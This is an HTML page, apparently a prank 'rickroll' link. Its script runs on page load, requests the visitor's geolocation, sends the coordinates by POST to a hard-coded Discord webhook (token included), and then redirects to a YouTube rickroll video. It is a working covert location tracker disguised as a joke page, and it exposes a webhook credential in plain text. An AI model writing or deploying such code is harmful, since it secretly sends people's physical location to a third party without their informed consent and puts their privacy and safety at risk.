<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rickroll</title>
</head>
<body>
    <script>
        // Funktion um die Geolocation des Benutzers zu erhalten
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                console.log("Geolocation is not supported by this browser.");
            }
        }

        // Funktion um die Position an den Webhook zu senden
        function showPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            // Webhook-URL, an die die Daten gesendet werden
            const webhookUrl = 'https://discord.com/api/webhooks/1406374866839535808/Fy7V05xk8u5zGUyQmz6ek2_wshrYnks_nc-Qk6RvwdY5qL8segzPDzWapXDrWjLEPeLo';

            // Daten im JSON-Format vorbereiten
            const data = JSON.stringify({
                latitude: latitude,
                longitude: longitude
            });

            // Fetch-Request an den Webhook senden
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: data
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
                // Weiterleitung zur Rickroll-Seite
                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
            })
            .catch((error) => {
                console.error('Error:', error);
                // Weiterleitung zur Rickroll-Seite, falls ein Fehler auftritt
                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
            });
        }

        // Geolocation abrufen, wenn die Seite geladen wird
        getLocation();
    </script>
</body>
</html>
